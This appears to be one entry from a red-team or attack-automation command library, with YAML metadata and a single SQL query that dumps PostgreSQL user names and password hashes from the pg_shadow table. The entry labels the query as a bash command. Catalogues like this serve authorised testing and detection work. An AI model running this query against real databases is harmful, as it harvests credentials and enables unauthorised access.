---
id: d40363d9-c0d9-4f2d-a7cc-c2863afe3379
name: Extract user credentials from pg_shadow table
type: command
executor: bash
data: SELECT usename, passwd FROM pg_shadow
output: null
created_at: '2023-04-06T03:56:35.516824+00:00'
updated_at: '2023-04-10T20:23:12.841372+00:00'
---

# Extract user credentials from pg_shadow table

```bash
SELECT usename, passwd FROM pg_shadow
```
